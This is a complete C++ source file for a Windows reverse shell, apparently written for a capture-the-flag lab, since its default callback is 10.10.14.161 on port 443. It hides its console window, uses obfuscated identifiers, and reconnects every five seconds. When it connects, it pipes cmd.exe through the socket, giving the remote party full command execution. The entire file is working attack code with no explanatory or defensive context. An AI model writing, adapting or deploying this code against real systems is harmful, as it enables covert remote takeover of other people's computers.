#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>

#pragma comment(lib, "Ws2_32.lib")

#define DEFAULT_BUFLEN 1024

void XTJRSHZ(char* XGFXEG, int XERGTJ) {
    while (true) {
        Sleep(5000);
        
        SOCKET REXQGW;
        sockaddr_in addr;
        WSADATA version;
        
        WSAStartup(MAKEWORD(2, 2), &version);
        REXQGW = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
        
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = inet_addr(XGFXEG);
        addr.sin_port = htons(XERGTJ);
        
        if (WSAConnect(REXQGW, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
            closesocket(REXQGW);
            WSACleanup();
            continue;
        }
        else {
            char RecvData[DEFAULT_BUFLEN];
            memset(RecvData, 0, sizeof(RecvData));
            
            int RecvCode = recv(REXQGW, RecvData, DEFAULT_BUFLEN, 0);
            
            if (RecvCode <= 0) {
                closesocket(REXQGW);
                WSACleanup();
                continue;
            }
            else {
                char Process[] = "cmd.exe";
                STARTUPINFO sinfo;
                PROCESS_INFORMATION pinfo;
                
                memset(&sinfo, 0, sizeof(sinfo));
                sinfo.cb = sizeof(sinfo);
                sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)REXQGW;
                
                CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
                
                WaitForSingleObject(pinfo.hProcess, INFINITE);
                CloseHandle(pinfo.hProcess);
                CloseHandle(pinfo.hThread);
                
                memset(RecvData, 0, sizeof(RecvData));
                RecvCode = recv(REXQGW, RecvData, DEFAULT_BUFLEN, 0);
                
                if (RecvCode <= 0) {
                    closesocket(REXQGW);
                    WSACleanup();
                    continue;
                }
                
                if (strcmp(RecvData, "exit\n") == 0) {
                    exit(0);
                }
            }
        }
    }
}

int main(int argc, char** argv) {
    FreeConsole();
    
    if (argc == 3) {
        int port = atoi(argv[2]);
        XTJRSHZ(argv[1], port);
    }
    else {
        char host[] = "10.10.14.161";
        int port = 443;
        XTJRSHZ(host, port);
    }
    
    return 0;
}
